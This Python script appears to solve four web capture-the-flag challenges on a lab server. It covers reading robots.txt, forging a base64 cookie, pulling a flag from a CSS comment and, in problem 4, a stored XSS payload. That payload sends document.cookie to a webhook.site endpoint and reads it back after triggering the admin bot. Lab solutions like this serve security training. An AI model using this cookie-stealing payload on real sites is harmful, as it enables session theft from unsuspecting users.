import sys
import requests # pip install requests
import base64
from urllib.parse import unquote,quote
import re
import time

def problem1():
    print("Problem: InsIIT")
    robots = requests.get('http://10.0.118.48:9999/robots.txt').text
    print(f"/robots.txt\v\n{robots}\n")
    path = robots.split('Disallow: ')[-1].strip()
    print(f'--\n{path}\n')
    print(f"Flag: ",end='')
    print(requests.get(f'http://10.0.118.48:9999{path}').text)


def problem2():
    print("Problem: oreo")
    sess = requests.session()
    sess.get('http://10.0.118.48:8888/')
    cur_cookies = sess.cookies.items()
    print(f"Current Cookies:\n{cur_cookies}\n\nDecoded flavour: {base64.b64decode(unquote(cur_cookies[0][1]).encode()).decode()}")
    sess.cookies.pop('flavour', None)
    sess.cookies.set('flavour',quote(base64.b64encode('chocolate'.encode()).decode()))
    changed = sess.cookies.items()
    print(f"\nCookies changed:\n{changed}\n\nDecoded flavour: {base64.b64decode(unquote(changed[0][1]).encode()).decode()}")
    print(f"\nFlag: {sess.get('http://10.0.118.48:8888/').text}")
    
    

def problem3():
    print("Problem: events")
    print("Getting the style.css file")
    t = requests.get('http://10.0.118.48:7777/static/style.css').text
    matches = re.findall(r'\/\*(.*)\*\/',t)
    print(f"Flag: {matches[0].strip()}")


def problem4():
    print("CNSxSS")
    server = "http://10.0.118.48:4444"
    uuid = requests.post("https://webhook.site/token").json()['uuid']
    sess = requests.Session()
    data = {
        "content": f'"; new Image().src = "https://webhook.site/{uuid}?k="+btoa(document.cookie);//'
    }
    print(f"Payload crafter: {data['content']}")
    r = sess.post(server,data=data,allow_redirects=True)
    message_uuild = r.url.rstrip('/').split('/')[-1]
    time.sleep(2)
    sess.post(f"http://10.0.118.48:4444/report/{message_uuild}",allow_redirects=True)
    print(f"Getting headers after XSS")
    time.sleep(10)
    log = requests.get(f"https://webhook.site/token/{uuid}/requests?sorting=newest").json()
    print(F"Flag: {log['data'][0]['user_agent'].split('=')[-1]}")
    

if __name__ == "__main__":
    n = sys.argv
    if len(n) != 2:
        print(f"Usage solution.py <problem_id>")
        exit()
    prob = int(n[1])
    exec(f"problem{prob}()")
